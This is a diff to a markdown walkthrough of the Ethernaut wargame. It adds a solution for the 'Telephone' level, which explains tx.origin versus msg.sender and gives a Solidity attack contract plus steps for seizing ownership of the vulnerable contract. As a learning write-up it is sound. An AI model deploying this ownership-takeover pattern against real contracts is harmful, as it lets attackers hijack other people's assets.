@@ -262,12 +262,59 @@ When you flip the coin correctly 10 times you'll complete the challenge.
 
 ### 4. Telephone
 
----
+> Claim ownership of the contract below to complete this level.
 
-Hope this was helpful and if you're interested in continuing here are some follow-up resources:
-- checkout the other challenges and continue on the Ethernaut game 
-- xx
+The goal of the challenge is to become the owner of the contract. 
 
+In order to hack it here are some helpful terms:
+- tx.origin: sender of the transaction (full call chain), this is the original external account (EOA). Only an EOA can initiate a transaction.  
+- msg.sender: immediate account (can be a smart contract account or an externally owned account)
+
+The part of the smart contract that we are interested in is the changeOwner(address _owner) function. 
+
+```
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+
+``` 
+
+Checkout the contract
+contract
+contract.abi
+await contract.owner() --> look at who the owner is
+
+Bottom line: do no use tx.origin for authorization. makes the smart contract vulnerable to a phising attack. The attacker can trick someone into starting the transaction. 
+
+#### Solution: 
+1. Create a new smart contract on Remix. Deploy the telephone contract.;
+2. create new telephoneHack solidity file. 
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+import './Telephone.sol';
+
+contract TelephoneHack {
+
+  Telephone telephoneContract;
+
+  constructor(address _address) public {
+    telephoneContract = Telephone(_address);
+  }
+
+  function hackContract(address _address) public {
+    telephoneContract.changeOwner(_address);
+  }
+}
+``` 
+3. get the contract.address
+4. deploy with the contract.address 
+5. await contract.owner()
+6. execute hackContract() with your address 
+7. await contract.owner()
+
+*basically we made a transaction from the smart contract as the tx.origin. 
 ---
 
 ### 5. Token 
